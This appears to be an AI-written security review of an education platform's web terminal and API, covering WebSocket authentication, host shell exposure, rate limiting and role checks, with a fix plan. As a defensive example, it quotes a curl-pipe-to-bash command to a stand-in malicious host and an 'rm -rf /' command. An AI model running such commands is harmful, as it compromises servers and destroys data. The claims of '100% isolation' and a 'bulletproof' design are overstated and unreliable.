# Production Security & Hardening Analysis

This is an analysis of your 10-point security mandate for transforming the AMIT-BODHIT system into a production-level Startup environment. 

## 1. Vulnerabilities Found in Current System

Your security outline perfectly maps to four high-risk vulnerabilities remaining in the current architecture:

1. **WebSocket Session Hijacking (CRITICAL) - Rule 10:**
   The `terminalService.js` WebSocket currently intercepts `token` from the URL string, but it **never actually runs `jwt.verify()`** to confirm who the token belongs to, nor does it check if the token owner possesses the `projectId`. Any user with a valid workspace URL could hijack the terminal.

2. **Unrestricted Remote Code Execution (CRITICAL) - Rule 4 & 5:**
   The terminal invokes `pty.spawn()` directly on the host Operating System (Windows/Linux). Even though `cwd` is locked to the workspace folder, the user can easily run `curl http://malicious-site.com/script.sh | bash` or `powershell Invoke-WebRequest` to compromise your entire backend server.

3. **Financial DoS via AI Engine (HIGH) - Rule 6:**
   There is zero Rate Limiting (`express-rate-limit`) on the LLM endpoints (`/tasks/submit`, `/tasks/:id/ask`). An attacker writing a simple `for` loop script could drain your entire Groq / LLM API balance in an hour.

4. **Missing Role-Based Access (MEDIUM) - Rule 1:**
   The `users` table has a `role` column (`admin` / `student`), but an `isAdmin` middleware does not exist. Any regular student could potentially trigger upcoming Course Engine content-creation endpoints if not strictly gated.

---

## 2. Feasibility & Architectural Conflicts in Your Rules

Your rules are overwhelmingly correct, but two of them **conflict with each other** technically:

**Conflict: Rule 4 (Whitelist Terminal Commands) vs The PTY Architecture**
You requested restricting the terminal strictly to `npm install`, `node`, etc. 
*Why this fails:* A real terminal (PTY) streams raw, single keystrokes (like typing `n`, then `p`, then `m`) over WebSockets. Intercepting and blocking entire commands *breaks* the terminal experience (arrow keys, text editors like Nano/Vim, clearing the screen). 
*The Only Safe Fix (Rule 5):* We **must** abandon command whitelisting on the host machine and instead put the terminal entirely inside an isolated **Docker Container (Linux Alpine/Ubuntu)** without internet access (or heavily restricted outbound firewall). If they run `rm -rf /` inside Docker, it only destroys their temporary sandbox, not your server.

---

## 3. Recommended Fix Plan (Order of Priority)

### Step 1: Fortify WebSocket Authentication (Immediate)
* **Goal:** Update `terminalService.js` to parse the `token`, run `jwt.verify()`, fetch the `project`, and ensure `req.user.id === project.user_id`. Disconnect instantly if validation fails.

### Step 2: Implement Rate Limiting & Input Validation
* **Goal:** Install `express-rate-limit` globally and apply strict limits (e.g., 5 AI chats per minute per user). Add strict `typeof` and string length limits on all endpoints to block oversized memory exhaustion payloads.

### Step 3: Containerize the Sandbox (Docker Integration)
* **Goal:** Replace `os.platform() === 'win32' ? 'powershell.exe' : 'bash'` with `docker run -it -w /workspace -v ${workspacePath}:/workspace node:20-alpine /bin/sh`. This provides CPU limits, network limitations, and 100% host OS isolation.

### Step 4: Role-Based Endpoints
* **Goal:** Before beginning the **Course Engine (VERSION-2.0)**, build an `isAdmin` middleware. Apply this to all static CMS creation endpoints so only the startup founders can curate projects.

---
**Conclusion:** Your 10-point security mandate is an excellent, mature standard for production. If we apply the Fix Plan above, the architecture will be bulletproof and fully ready to scale.
